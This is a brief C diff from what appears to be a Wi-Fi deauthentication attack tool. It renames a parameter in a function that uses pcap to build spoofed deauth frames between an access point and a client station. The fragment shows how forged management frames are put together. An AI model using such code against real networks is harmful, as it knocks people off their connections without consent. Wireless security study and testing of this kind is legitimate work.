@@ -30,7 +30,7 @@ void SendBroadcastDeauth(pcap_t* handle, Mac apMac) {
 	}
 }
 
-void SendUnicastDeauth(pcap_t* handle, Mac apMac, Mac stationMac) {
+void SendUnicastDeauth(pcap_t* handle, Mac apMac, Mac stMac) {
 	int res;
 
         DeauthAttackPacket apPkt, stPkt;
@@ -44,11 +44,11 @@ void SendUnicastDeauth(pcap_t* handle, Mac apMac, Mac stationMac) {
 	apPkt.man[0] = 0x07;
 	stPkt.man[0] = 0x07;
 	
-        memcpy(&apPkt.rcv, (uint8_t*)stationMac, sizeof(Mac));
+        memcpy(&apPkt.rcv, (uint8_t*)stMac, sizeof(Mac));
 	memcpy(&apPkt.trs, (uint8_t*)apMac, sizeof(Mac));
 
         memcpy(&stPkt.rcv, (uint8_t*)apMac, sizeof(Mac));
-	memcpy(&stPkt.trs, (uint8_t*)stationMac, sizeof(Mac));
+	memcpy(&stPkt.trs, (uint8_t*)stMac, sizeof(Mac));
 
 	memcpy(&apPkt.bssid, (uint8_t*)apMac, sizeof(Mac));
 	memcpy(&stPkt.bssid, (uint8_t*)apMac, sizeof(Mac));
